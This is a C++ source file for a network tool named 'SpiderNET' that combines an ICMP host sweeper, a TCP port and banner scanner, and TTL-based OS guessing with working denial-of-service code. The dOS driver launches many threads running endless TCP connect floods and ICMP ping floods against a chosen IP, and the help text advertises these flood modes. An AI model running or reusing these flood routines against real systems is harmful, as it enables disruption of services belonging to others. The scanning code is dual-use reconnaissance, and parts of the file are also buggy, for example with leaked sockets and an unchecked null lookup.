#include <netdb.h>
#include<stdlib.h>
#include<stdio.h>
#include <cstring>
#include<iostream>
#include<sys/socket.h>
#include<arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <thread>
#include <netinet/ip_icmp.h>
#include <sys/time.h>
#include <math.h>
#include <string>
#include <mutex>
#include <sstream>

struct TargetIfo{

    bool status;
    int ttl;
    std::string ip;
    double rtt_ms;
};

 /*
 * Math calc binary - RFC 1071 IP/ICMP/UDP/TCP
 *  @param b Pointer to the data buffer.
 *  @param len Buffer size in bytes.
 *  @return 16-bit checksum with one's complement.
 */
unsigned short checksum(void *b, int len) {    
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;

    if (len == 1)
        sum += *(unsigned char *)buf;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}
bool ip_response(const char *ip){
    
    

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    
    if (sock < 0)
    {
        fprintf(stderr, "You are not sudo \n");
        return false;
    }else{

        // Timeout 
        struct timeval tv;
        tv.tv_sec = 0; 
        tv.tv_usec = 200000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);

        // Target
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        inet_pton(AF_INET, ip, &target.sin_addr);


        // ICMP package  
        char package[64];
        memset(package, 0, sizeof(package));

        struct icmphdr *icmp = (struct icmphdr*)package;

        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        icmp->un.echo.id = htons(1234);
        icmp->un.echo.sequence = htons(1);

        //Calc checksum                         
        icmp->checksum = checksum(package, sizeof(package)); // calc from  total package 

        // Sendto <- send package send without making connection 
        sendto(sock, package, sizeof(package), 0, (struct sockaddr*)&target, sizeof(target));

        // Respost from timeout
        char buffer_respost[1024];
        struct sockaddr_in sender;
        socklen_t len = sizeof(sender);

        
        while(true){
            int bytes = recvfrom(sock, buffer_respost, sizeof(buffer_respost), 0, (struct sockaddr*)&sender, &len );
        
            if(bytes <= 0){
                close(sock);
                return false;   
            }
            //Math calc for ICMP
            struct iphdr *ip_header = (struct iphdr *)buffer_respost;
            int header_len = ip_header->ihl * 4;



            struct icmphdr *reply = (struct icmphdr *)(buffer_respost + header_len);
            // Filter
            if(reply->type == ICMP_ECHOREPLY && reply->un.echo.id == htons(1234)){
                
                char d[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &sender.sin_addr, d, INET_ADDRSTRLEN);

                std::string s1 = ip;
                std::string s2 = d;
            
                if (s1 == s2) {
                    close(sock);
                 
                    return true;
                } 
                else {
                    continue; 
                }
            }
        }

    }
    
}
void aux_ip_response(const char * ip){

    if(ip_response(ip) == true ){

        printf("Host valid\n");
    }
    else{

        fprintf(stderr, "Invalid host\n");
    }

}
TargetIfo fingerprinting(const char * ip){
    std::string ip_str = ip;
    
    TargetIfo info_target;
    info_target.ttl = 0;
    info_target.ip = ip;
    info_target.status = "OFILINE";

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP );

    if(sock < 0){

        return info_target;
    }

    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 200000;
    
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    inet_pton(AF_INET, ip, &target.sin_addr);

    char package[64];
    memset(package, 0, sizeof(package));

    struct icmphdr *icmp = (struct icmphdr*)package;

    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = htons(1234);
    icmp->un.echo.sequence = htons(1);

    icmp->checksum = checksum(package, sizeof(package));

    sendto(sock, package, sizeof(package), 0, (struct sockaddr*)&target, sizeof(target)); 

    char buffer_respost[256];
    struct sockaddr_in sender;
    socklen_t len = sizeof(sender);


    while(true){
        int bytes = recvfrom(sock, buffer_respost, sizeof(buffer_respost), 0, (struct sockaddr*)&sender, &len );

        if(bytes <= 0){
            close(sock);
            info_target.status = "OFILINE";
            return info_target;
        }

        
        struct iphdr *ip_header = (struct iphdr *)buffer_respost;
        int header_len = ip_header->ihl * 4;
        
        struct icmphdr *reply = (struct icmphdr *)(buffer_respost + header_len);
        
        int capture_ttl = ip_header->ttl;

        if(reply->type == ICMP_ECHOREPLY && reply->un.echo.id == htons(1234)){
            
            char d[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &sender.sin_addr, d, INET_ADDRSTRLEN);

            std::string s1 = ip;
            std::string s2 = d;
        
            if (s1 == s2) {
                close(sock);
                info_target.status = "OLINE";
                info_target.ttl = capture_ttl;
                return info_target;
            }   
            else {
                continue; 
            }
        }
    
    }

    
    info_target.status = "OFILINE";

    close(sock);
    return info_target;

}

std::string os_detector(const char *ip){
   
    if(ip_response(ip) == false ) return "refused_connection";
   
    TargetIfo target_info = fingerprinting(ip);

    if(target_info.ttl == 0) return "No os detected";


    else if(target_info.ttl <= 64) return "Linux";

    else if(target_info.ttl <= 126) return "Windows";

    else if(target_info.ttl <= 255) return "Router";

    else return "unknown ";

}

std::mutex print_lock;
void make_scan_rage(std::string ip){
    

    if(ip_response(ip.c_str()) == true ){
        print_lock.lock();
        printf("[-] host oline: %s \n", ip.c_str());
        print_lock.unlock();
    }
}

void show_ips(const char * ip_range, int CIDR ){
    int const_aux = 0; 
    for(int i = 24; i <= 30; i ++){
        if(i == CIDR){
            const_aux = pow(2, (32 - CIDR)) -2 ;
            break;      
        }
    }
    char base_network [20];
    strcpy(base_network, ip_range); 
    //cut rage     
    char *delimiter = strrchr(base_network, '.');
    if (delimiter != NULL) {
        *(delimiter + 1) = '\0'; 
    }

    printf("[*] Scanning network: %s0/%i \n", base_network, CIDR);
    printf("[*] Total hosts to scan: %d \n", const_aux);
    printf("[*] Searching... \n");
    std::vector<std::thread> spiders;

    for(int i = 1; i <= const_aux; i ++){
        char ip_loop[INET_ADDRSTRLEN];
        sprintf(ip_loop, "%s%d", base_network, i);
        
        spiders.emplace_back(make_scan_rage, std::string(ip_loop));
    
    }

    for(auto& t : spiders){
        if(t.joinable()) t.join();
    }
}

bool scan_port_aux(const char  *ip, int port){
  
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        return false;
    }
 
    struct sockaddr_in host;
    host.sin_family = AF_INET;
    host.sin_port = htons(port);
    inet_pton(AF_INET, ip, &host.sin_addr);

    int connection = connect(sock, (struct sockaddr*)&host, sizeof(host));

    if(connection < 0){
        return false;
    }
    else{
        return true;
    }

    close(sock);
}

std::string process_info(int port){
    struct servent *service;
    service = getservbyport(htons(port), "tcp");

    std::string str_return = service->s_name;

    return str_return;
}

//Scan one port 
void scan_port(const char * ip, int port){

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    
    if(sock < 0){
        fprintf(stderr,"[-]Error creating socket\n ");
        return;
    }
            
    struct timeval tv;
    tv.tv_sec = 1; tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);

    struct sockaddr_in host;;
    host.sin_family = AF_INET;
    host.sin_port = htons(port);
    inet_pton(AF_INET, ip, &host.sin_addr);

    int connection = connect(sock, (struct sockaddr*)&host, sizeof(host));
    
    if(connection == 0){
        
        char buffer [1024];
        memset(buffer, 0, sizeof(buffer));
        int bytes = recv(sock, buffer, 1023, 0);

        if(port == 80 || port == 443 || port == 8080){
        
            const char* req = "HEAD / HTTP/1.0\r\n\r\n";
            send(sock, req, strlen(req), 0);

        }

        std::string os = os_detector(ip);
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        
        if(bytes > 0 ){
         
            std::string banner = buffer;
            printf("[*] Connected \n");
            printf("[*] %s", buffer);
            printf("[*] Os: %s\n", os.c_str());

        }else{

            printf("[*] Connected \n");
            printf("[-] No banner service\n");
            printf("[*] Port: %i, proocess info: %s\n ", port, process_info(port).c_str());                

        }
    }
    close(sock);  
}

void scan_all(const char *ip, std::vector<int> ports){
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    
    if(sock < 0){

        fprintf(stderr, "[-] Error creating socket\n");
        return;
    }


    for(int i = 0; i < ports.size(); i ++ ){
        
        if(scan_port_aux(ip, ports[i]) == true){

           std::string os = os_detector(ip);
           printf("\n==================================\n");
           printf("[*] Port: %i open \n", ports[i]);
           printf("[*] Process %s\n", process_info(ports[i]).c_str());
           printf("[*]Os: %s\n",os.c_str());
           printf("==================================\n");
           
        }else{

            printf("[*] Port %i, %s closed\n", ports[i], process_info(ports[i]).c_str());

        }
       
    }
    
}

void scan_all(const char *ip){
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    
    for(int i = 0; i <= 65535; i ++){
        struct servent *service;
        service = getservbyport(htons(i), "tcp");
        
        if(scan_port_aux(ip, i ) ==true ){
            printf("[*] Open port: %i int host: %s \n",i, ip );
            
            if(service != NULL){
                printf("[-] Process: %s \n", service->s_name);
            }            
        }            
    }
    
}
//DnsResolver
void payloadHost(char *buffer){
    struct hostent *hostInfo;
    hostInfo = gethostbyname(buffer);
    char ipChar[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, hostInfo->h_addr,ipChar, INET_ADDRSTRLEN );
    
    std::string ip(ipChar);
    // making payload
    strncpy(buffer, ip.c_str(), 15);
    buffer[14] = '\0';

}

 //* TCp flood DOS
void tcp_flood( const char *ip, int port){
    struct sockaddr_in host;
    host.sin_family = AF_INET;
    host.sin_port = htons(port);
    inet_pton(AF_INET, ip, &host.sin_addr);

    while(true) { 

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        connect(sock, (struct sockaddr*)&host, sizeof(host));
        
        close(sock);
        
    }
}

//* Ping flood DOS
void ping_flood(const char *ip, int size){
    //Otimizar -->> 
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    //Big spider aloc 
    int big_spider = sizeof(struct icmphdr) + size;   
    char *package = new char[big_spider];
    memset(package, 'X', big_spider);

    struct icmphdr *icmp = (struct icmphdr *)package;
    icmp->type = ICMP_ECHO;
    icmp->un.echo.id = htons(1234);
    icmp->un.echo.sequence = htons(1);

    icmp->checksum =0;
    icmp->checksum = checksum(package, big_spider);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
  
    if (sock < 0)
    {   
        delete[] package;
        fprintf(stderr, "[*] You are not a sudo \n");
        return;
    }

    while (true)
    {
        
     sendto(sock, package, big_spider, 0, (struct sockaddr*)&target, sizeof(target));
                
    }
 
}
//Pardao th 100
void dOS ( int th, const char *ip, int type ){
   

    std::vector<std::thread> spiders;
   
    if(type == 1){
    
        int port = 0; 
        printf("[-] Enter with the port: \n");
        scanf("%i", &port);
        
        printf("[*] Type [%i] tcp-flood \n", type);
        printf("[*] Number of threads: [%i] \n", th);
        printf("[*] Send packages. . . .\n");

        for(int i = 0; i < th; i ++){
           spiders.emplace_back(tcp_flood, ip, port);
        
        }

    }else{
        int size = 0;
        
        printf("[*] What number of spiders to attack ? (MAX number = 2^{16} -1 ) \n");
        scanf("%i", &size);
       
        if(size > 65507){
            fprintf(stderr,"[*] Limit of spiders: %i \n", 65507);
            return;
            
        }else{
            printf("[*] BIG SPIDER ATCK \n");

            for(int i = 0; i < th; i ++){
                spiders.emplace_back(ping_flood, ip, size);
    
            }
            for(auto& t : spiders){
            if(t.joinable()){
                t.join();
            }
        }
    
        }
    }   
    for(auto& t : spiders){
        if(t.joinable()){
            t.join();
        }
    }
    
}

void man(){

    printf("\n- SpiderNET -- version 0.0001\n");
    //Scanner ports -- 
    printf("Usage: -s: for scanner\n");
    printf(" -sO 'ip' -p 'port' -\n");
    printf(" -sL 'ip' -p 'list_ports' ex: --> ./SpiderNet -sL 10.10.10.10 -p 21,22,4444,8080,19,33,8000,443 \n");
    printf(" -sA 'ip' no ports: scan all ports int host\n\n");

    //Dos
    printf(" -For Dos usage -D\n");
    printf(" -D1- Dos tcp flood D2- Dos ping flood\n");
    printf(" -D1 'ip -p 'port\n");

}

void spider_name(){

    printf(
    " ____        _     _           _   _ _____ _____ \n"
    "/ ___| _ __ (_) __| | ___ _ __| \\ | | ____|_   _|\n"
    "\\___ \\| '_ \\| |/ _` |/ _ \\ '__|  \\| |  _|   | |  \n"
    " ___) | |_) | | (_| |  __/ |  | |\\  | |___  | |  \n"
    "|____/| .__/|_|\\__,_|\\___|_|  |_| \\_|_____| |_|  \n"
    "      |_|                                         \n"
    );
}


int main( int argc,  char * argv[] ){
    /*
    char  ip [16] = "";

    int port = 21;

    std::cout << "Debug ip resonse: status host " << ip_response(ip) << std::endl;

    std::cout << "Debug scan_port --> " << std::endl;

    std::cout << "===============" << std::endl;
    scan_port(ip, port);

    */

    if(argc <=1){

        printf("Use './SpiderNet -H '  for more details\n ");
    
        return 0;
    }

    if(argc > 1 && std::string(argv[1])== "-H"){
        man();
    }
    
    //-- para criar
    
   // printf(" -sA 'ip' no ports: scan all ports int host\n\n");

    if(std::string(argv[1]) == "-sO" && std::string(argv[3]) =="-p"){
        
        const char *ip = argv[2];
        int prot = std::stoi(argv[4]);

        scan_port(ip, prot);


    }else if(std::string(argv[1]) == "-sL" && std::string(argv[3]) =="-p"){

        const char *ip = argv[2];

        std::string portsRaw = argv[4];

        std::vector<int> portList;
        std::stringstream ss(portsRaw);
        std::string segment;
        
        while(std::getline(ss, segment, ',')){

            try
            {   
                int port = std::stoi(segment);
                portList.push_back(port);

            }
            catch(const std::exception& e)
            {
                std::cerr << segment << " its a not valid port" <<  '\n';
            }
            
        }

        std::cout << "Ports colecteds " << std::endl;

        scan_all(ip, portList);

 
    }
      


}
 